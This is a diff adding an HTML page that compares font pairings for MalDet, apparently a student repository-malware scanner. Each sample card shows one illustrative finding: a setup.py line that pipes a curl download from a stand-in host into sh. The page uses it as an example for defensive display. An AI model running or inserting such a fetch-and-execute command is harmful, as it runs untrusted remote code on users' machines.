@@ -1,0 +1,83 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>MalDet font options</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Instrument+Serif:ital@0;1&family=Inter:wght@400;600;700&family=JetBrains+Mono:wght@400;500&family=Newsreader:ital,opsz,wght@0,6..72,400;1,6..72,400&family=IBM+Plex+Sans:wght@400;600;700&family=IBM+Plex+Mono:wght@400;500&family=IBM+Plex+Serif:ital,wght@0,400;1,400&family=Bricolage+Grotesque:opsz,wght@12..96,500;12..96,700&family=Public+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root { --forest:#0c1a13; --glow:#5fd38a; --paper:#f3f4ef; --ink:#111a14; --muted:#56625a; --line:#e2e5dd; --critical:#e86a5a; --medium:#e8b84a; }
+  * { box-sizing: border-box; }
+  body { margin:0; background:var(--paper); color:var(--ink); font-family: system-ui, sans-serif; padding: 32px 16px; }
+  h1.page { font: 600 1.1rem system-ui; margin: 0 auto 4px; max-width: 1200px; }
+  p.page { color: var(--muted); margin: 0 auto 24px; max-width: 1200px; }
+  .grid { display:grid; gap:20px; max-width:1200px; margin:0 auto; grid-template-columns: repeat(auto-fit, minmax(520px, 1fr)); }
+  @media (max-width: 600px) { .grid { grid-template-columns: 1fr; } }
+  .opt { background:#fff; border:1px solid var(--line); border-radius:16px; overflow:hidden; }
+  .opt header { padding:14px 20px; border-bottom:1px solid var(--line); display:flex; justify-content:space-between; gap:12px; font: 600 .85rem system-ui; }
+  .opt header span { color: var(--muted); font-weight: 400; }
+  .hero { background: radial-gradient(60% 60% at 80% 20%, rgba(95,211,138,.2), transparent 70%), var(--forest); color:#eef3ef; padding:28px 24px; }
+  .eyebrow { font-size:.72rem; letter-spacing:.08em; text-transform:uppercase; color:var(--glow); font-weight:600; margin:0 0 10px; }
+  .hero h2 { font-weight:400; font-size:2.6rem; line-height:1.03; margin:0 0 14px; color:#fff; }
+  .hero h2 em { color:var(--glow); }
+  .hero p { color:#a9bdb0; margin:0; line-height:1.6; font-size:.98rem; }
+  .body { padding:20px 24px 24px; }
+  .stat { display:flex; align-items:baseline; gap:12px; margin-bottom:14px; }
+  .stat b { font-size:2.4rem; font-weight:400; line-height:1; }
+  .stat span { font-weight:600; }
+  .finding { border:1px solid var(--line); border-radius:12px; padding:12px 14px; }
+  .meta { display:flex; gap:10px; align-items:center; margin-bottom:6px; flex-wrap:wrap; }
+  .badge { font-size:.68rem; font-weight:700; letter-spacing:.04em; text-transform:uppercase; border-radius:999px; padding:3px 9px; }
+  .loc { font-size:.8rem; color:var(--muted); }
+  .finding p { margin:0 0 8px; font-size:.92rem; }
+  pre { margin:0; background:var(--forest); color:#dce8df; border-radius:8px; padding:10px 12px; font-size:.8rem; overflow-x:auto; }
+  .why { margin:14px 0 0; color:var(--muted); font-size:.85rem; line-height:1.5; font-family: system-ui, sans-serif; }
+
+  .f0 .d { font-family:"Instrument Serif", serif; } .f0 .s { font-family:"Inter", sans-serif; } .f0 .m { font-family:"JetBrains Mono", monospace; }
+  .f1 .d { font-family:"Newsreader", serif; } .f1 .s { font-family:"IBM Plex Sans", sans-serif; } .f1 .m { font-family:"IBM Plex Mono", monospace; }
+  .f2 .d { font-family:"IBM Plex Serif", serif; } .f2 .s { font-family:"IBM Plex Sans", sans-serif; } .f2 .m { font-family:"IBM Plex Mono", monospace; }
+  .f3 .d { font-family:"Bricolage Grotesque", sans-serif; font-weight:700 !important; letter-spacing:-.02em; } .f3 .s { font-family:"Public Sans", sans-serif; } .f3 .m { font-family:"JetBrains Mono", monospace; }
+  .f2 .hero h2, .f1 .hero h2 { font-size:2.4rem; } .f3 .hero h2 { font-size:2.2rem; } .f3 .hero h2 em { font-style:normal; }
+</style>
+</head>
+<body>
+<h1 class="page">MalDet font options</h1>
+<p class="page">Each card uses the same pieces of the real site: headline, paragraph, a statistic and a finding with code. Compare them, then pick one.</p>
+
+<div class="grid">
+</div>
+
+<script>
+  var options = [
+    ["f0", "Current", "Instrument Serif + Inter + JetBrains Mono",
+     "Closest to the reference image. Elegant and fashionable, but very common on new sites, and the narrow serif reads more lifestyle brand than security tool."],
+    ["f1", "A · Security research report", "Newsreader + IBM Plex Sans + IBM Plex Mono",
+     "Newsreader was designed for long-form reading, so the headlines read like a published security advisory. IBM Plex is an engineering typeface, sturdy in tables and code. Keeps the reference's italic headline style."],
+    ["f2", "B · Engineering lab", "IBM Plex Serif + IBM Plex Sans + IBM Plex Mono",
+     "One family in three styles, so everything matches perfectly. Plainer and more technical than A, less like the reference. Safe and very consistent."],
+    ["f3", "C · Modern tool", "Bricolage Grotesque + Public Sans + JetBrains Mono",
+     "Drops the serif for a bold, characterful sans headline. Feels like a modern developer product. Moves furthest from the reference image."]
+  ];
+  var grid = document.querySelector('.grid');
+  options.forEach(function (o) {
+    grid.insertAdjacentHTML('beforeend',
+      '<section class="opt ' + o[0] + '">' +
+        '<header>' + o[1] + '<span>' + o[2] + '</span></header>' +
+        '<div class="hero"><p class="eyebrow s">Final Year Project · Diploma in Information Security</p>' +
+          '<h2 class="d">Know what a repository hides <em>before you run it.</em></h2>' +
+          '<p class="s">MalDet scans a public GitHub repository with six detection engines and gives you two clear verdicts.</p></div>' +
+        '<div class="body s">' +
+          '<div class="stat"><b class="d">63,369</b><span>Findings analysed</span></div>' +
+          '<div class="finding"><div class="meta"><span class="badge" style="background:var(--critical)">Critical</span>' +
+            '<span class="loc m">setup.py:42</span></div>' +
+            '<p>Install script downloads and runs a remote payload during pip install.</p>' +
+            '<pre class="m">os.system("curl -s http://x.io/p.sh | sh")</pre></div>' +
+          '<p class="why">' + o[3] + '</p>' +
+        '</div>' +
+      '</section>');
+  });
+</script>
+</body>
+</html>
